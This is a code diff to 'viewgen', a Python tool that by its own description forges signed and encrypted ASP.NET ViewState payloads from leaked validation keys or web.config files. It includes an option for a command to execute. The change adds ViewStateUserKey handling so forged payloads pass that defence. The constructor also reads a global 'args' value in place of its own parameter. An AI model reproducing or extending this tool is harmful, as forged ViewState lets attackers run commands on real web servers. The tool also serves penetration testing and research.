@@ -37,11 +37,10 @@ def warning(s):
 
 class ViewGen:
 	MD5_MODIFIER = b"\x00"*4
-	MODIFIER_SIZE = 4
 	hash_algs = {"SHA1": hashlib.sha1, "MD5": hashlib.md5, "SHA256": hashlib.sha256, "SHA384": hashlib.sha384, "SHA512": hashlib.sha512, "AES": hashlib.sha1, "3DES": hashlib.sha1}
 	hash_sizes = {"SHA1": 20, "MD5": 16, "SHA256": 32, "SHA384": 48, "SHA512": 64, "AES": 20, "3DES": 20}
 
-	def __init__(self, validation_key=None, validation_alg=None, dec_key=None, dec_alg=None, modifier=None, encrypted=False):
+	def __init__(self, validation_key=None, validation_alg=None, dec_key=None, dec_alg=None, modifier=None, encrypted=False, viewstateuserkey=None):
 		self.validation_key = validation_key
 		self.dec_key = dec_key
 		self._init_validation_alg(validation_alg)
@@ -51,6 +50,10 @@ class ViewGen:
 			self.modifier = ViewGen.MD5_MODIFIER
 		else:
 			self.modifier = struct.pack("<I", int(modifier, 16))
+		if viewstateuserkey:
+			self.viewstateuserkey = bytes(viewstateuserkey, "utf-16le")
+			self.modifier += self.viewstateuserkey
+		self.modifier_size = 4 + len(bytes(args.viewstateuserkey, "utf-16le")) if args.viewstateuserkey else 4
 		self._reuse_iv = False
 		self._iv = None
 		self._random_bytes = None
@@ -133,8 +136,8 @@ class ViewGen:
 		unpad_dec = unpad(dec)
 		self._random_bytes = unpad_dec[:random_bytes_size]
 		self._iv = iv
-		modifier = unpad_dec[-ViewGen.MODIFIER_SIZE:]
-		idx = ViewGen.MODIFIER_SIZE
+		modifier = unpad_dec[-self.modifier_size:]
+		idx = self.modifier_size
 		if self._double_signature:
 			idx += 20
 
@@ -248,6 +251,7 @@ def parse_args():
 	parser = argparse.ArgumentParser(description="viewgen is a ViewState tool capable of generating both signed and encrypted payloads with leaked validation keys or web.config files")
 	parser.add_argument("--webconfig", help="automatically load keys and algorithms from a web.config file", required=False)
 	parser.add_argument("-m", "--modifier", help="VIEWSTATEGENERATOR value", required=False, default="00000000")
+	parser.add_argument("--viewstateuserkey", help="ViewStateUserKey value", required=False)
 	parser.add_argument("-c", "--command", help="command to execute", required=False)
 	parser.add_argument("--decode", help="decode a ViewState payload", required=False, default=False, action="store_true")
 	parser.add_argument("--guess", help="guess signature and encryption mode for a given payload", required=False, default=False, action="store_true")
@@ -296,7 +300,7 @@ def run_viewgen(args):
 			warning("Please provide validation key and algorithm or a valid web.config")
 			exit(1)
 
-	viewgen = ViewGen(binascii.unhexlify(args.vkey), args.valg, binascii.unhexlify(args.dkey), args.dalg, args.modifier, args.encrypted)
+	viewgen = ViewGen(binascii.unhexlify(args.vkey), args.valg, binascii.unhexlify(args.dkey), args.dalg, args.modifier, args.encrypted, args.viewstateuserkey)
 
 	if args.decode:
 		viewstate, signature = viewgen.decode(args.payload, parse=True)
